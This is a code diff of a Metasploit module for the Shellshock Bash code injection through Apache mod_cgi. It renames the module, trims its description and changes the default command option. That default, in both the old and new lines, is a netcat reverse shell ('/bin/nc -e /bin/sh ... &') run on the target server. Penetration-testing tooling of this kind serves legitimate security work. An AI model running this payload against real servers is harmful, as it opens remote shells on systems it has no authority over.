@@ -11,14 +11,11 @@ class Metasploit4 < Msf::Auxiliary
 
   def initialize(info = {})
     super(update_info(info,
-      'Name' => 'Bash Specially-Crafted Environment Variables Code Injection Attack via Apache mod_cgi',
+      'Name' => 'Apache mod_cgi Bash Environment Variable Code Injection',
       'Description' => %q{
         This module exploits a code injection in specially crafted environment
         variables in Bash, specifically targeting Apache mod_cgi scripts through
         the HTTP_USER_AGENT variable.
-
-        If you use the default CMD, please change LHOST and LPORT. Also, you
-        will need a Netcat with the -e (GAPING_SECURITY_HOLE) option.
       },
       'Author' => [
         'Stephane Chazelas', # Vulnerability discovery
@@ -35,7 +32,8 @@ class Metasploit4 < Msf::Auxiliary
 
     register_options([
       OptString.new('TARGETURI', [true, 'Path to CGI script']),
-      OptString.new('CMD', [true, 'Command to run (absolute paths required)', '/bin/nc -e /bin/sh LHOST LPORT &'])
+      OptString.new('CMD', [true, 'Command to run (absolute paths required)',
+        '/bin/nc -e /bin/sh 127.0.0.1 4444 &'])
     ], self.class)
   end
 
